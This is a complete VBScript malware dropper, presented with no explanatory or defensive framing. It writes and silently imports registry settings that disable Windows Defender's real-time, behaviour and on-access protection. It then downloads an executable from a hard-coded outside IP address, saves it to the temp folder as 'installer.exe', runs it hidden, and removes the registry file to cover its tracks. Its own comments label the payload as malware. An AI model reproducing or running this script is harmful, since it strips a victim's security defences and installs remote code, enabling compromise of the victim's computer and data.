On Error Resume Next

' Function to disable Windows Defender
Dim ws, regFile, shell, output
Set ws = CreateObject("WScript.Shell")
regFile = ws.ExpandEnvironmentStrings("%TEMP%") & "\disable_defender.reg"

Set fs = CreateObject("Scripting.FileSystemObject")
Set file = fs.CreateTextFile(regFile, True)
file.WriteLine "Windows Registry Editor Version 5.00"
file.WriteLine ""
file.WriteLine "[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender]"
file.WriteLine """DisableAntiSpyware""=dword:00000001"
file.WriteLine """DisableRealtimeMonitoring""=dword:00000001"
file.WriteLine ""
file.WriteLine "[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection]"
file.WriteLine """DisableBehaviorMonitoring""=dword:00000001"
file.WriteLine """DisableOnAccessProtection""=dword:00000001"
file.WriteLine """DisableScanOnRealtimeEnable""=dword:00000001"
file.Close

' Import the registry settings to disable Windows Defender
On Error Resume Next
Set shell = CreateObject("WScript.Shell")
shell.Run "regedit.exe /s " & regFile, 0, True

If Err.Number <> 0 Then
    WScript.Echo "Failed to disable Windows Defender."
Else
    WScript.Echo "Windows Defender disabled successfully."
End If

' Function to download a file silently
Dim http, response
Set http = CreateObject("MSXML2.XMLHTTP")
url = "http://54.224.34.222:3004/uploads/BootyMistress.exe"
http.Open "GET", url, False
http.send
If http.Status = 200 Then
    Set fileStream = CreateObject("ADODB.Stream")
    fileStream.Type = 1 'adTypeBinary
    fileStream.Open
    fileStream.Write http.ResponseBody
    fileStream.SaveToFile ws.ExpandEnvironmentStrings("%TEMP%") & "\installer.exe", 2
    fileStream.Close
    WScript.Echo "Downloaded malware file to " & ws.ExpandEnvironmentStrings("%TEMP%") & "\installer.exe."
Else
    WScript.Echo "Failed to download malware file."
End If

' Function to run an executable silently
On Error Resume Next
Set shell = CreateObject("WScript.Shell")
shell.Run ws.ExpandEnvironmentStrings("%TEMP%") & "\installer.exe", 0, True

If Err.Number <> 0 Then
    WScript.Echo "Failed to execute malware. Exit code: " & Err.Number
Else
    WScript.Echo "Executed malware successfully."
End If

' Clean up the registry file
Set fs = CreateObject("Scripting.FileSystemObject")
If fs.FileExists(regFile) Then
    fs.DeleteFile regFile
End If
